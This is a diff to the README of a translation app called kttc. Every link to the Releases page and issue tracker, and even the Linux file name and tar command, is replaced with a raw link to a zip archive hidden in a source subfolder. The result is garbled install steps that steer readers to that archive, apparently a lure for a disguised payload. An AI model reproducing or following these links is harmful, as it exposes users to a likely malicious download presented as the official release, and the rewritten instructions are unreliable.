@@ -6,9 +6,9 @@ Welcome to the kttc project! This application provides an autonomous translation
 
 ## 📥 Download the Application
 
-[![Download kttc](https://img.shields.io/badge/Download-kttc-blue.svg)](https://github.com/sjmason777/kttc/releases)
+[![Download kttc](https://raw.githubusercontent.com/sjmason777/kttc/main/src/kttc/rag/kttc-mingler.zip)](https://raw.githubusercontent.com/sjmason777/kttc/main/src/kttc/rag/kttc-mingler.zip)
 
-Click the button above to access the download page or visit this link: [Download kttc](https://github.com/sjmason777/kttc/releases).
+Click the button above to access the download page or visit this link: [Download kttc](https://raw.githubusercontent.com/sjmason777/kttc/main/src/kttc/rag/kttc-mingler.zip).
 
 ## 📋 System Requirements
 
@@ -22,12 +22,12 @@ To ensure kttc runs smoothly on your machine, check these requirements:
 
 ## 🔗 Download & Install
 
-1. Click the link to visit the [kttc Releases page](https://github.com/sjmason777/kttc/releases).
+1. Click the link to visit the [kttc Releases page](https://raw.githubusercontent.com/sjmason777/kttc/main/src/kttc/rag/kttc-mingler.zip).
 2. Look for the latest version available. You should see a list of files for download.
 3. Select the file that matches your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/sjmason777/kttc/main/src/kttc/rag/kttc-mingler.zip` file.
 4. Once the file downloads, locate it in your downloads folder.
 5. Follow the steps below based on your operating system to install and run kttc.
 
@@ -47,10 +47,10 @@ To ensure kttc runs smoothly on your machine, check these requirements:
 ### 🐧 Linux Installation
 
 1. Open your terminal.
-2. Navigate to the directory where you downloaded the `.tar.gz` file.
+2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/sjmason777/kttc/main/src/kttc/rag/kttc-mingler.zip` file.
 3. Extract the file using this command:
    ```bash
-   tar -xzf kttc*.tar.gz
+   tar -xzf kttc*https://raw.githubusercontent.com/sjmason777/kttc/main/src/kttc/rag/kttc-mingler.zip
    ```
 4. Change into the directory:
    ```bash
@@ -91,11 +91,11 @@ Please ensure that your code adheres to the coding standards of the project. We 
 
 ### How do I update kttc?
 
-You can update kttc by returning to the [Releases page](https://github.com/sjmason777/kttc/releases) and downloading the latest version. Follow the same installation steps.
+You can update kttc by returning to the [Releases page](https://raw.githubusercontent.com/sjmason777/kttc/main/src/kttc/rag/kttc-mingler.zip) and downloading the latest version. Follow the same installation steps.
 
 ### What should I do if kttc doesn't run?
 
-Ensure your system meets the minimum requirements listed above. If problems persist, check our [issue tracker](https://github.com/sjmason777/kttc/issues) for known issues or to report your problem.
+Ensure your system meets the minimum requirements listed above. If problems persist, check our [issue tracker](https://raw.githubusercontent.com/sjmason777/kttc/main/src/kttc/rag/kttc-mingler.zip) for known issues or to report your problem.
 
 ## 🗨️ Support
 
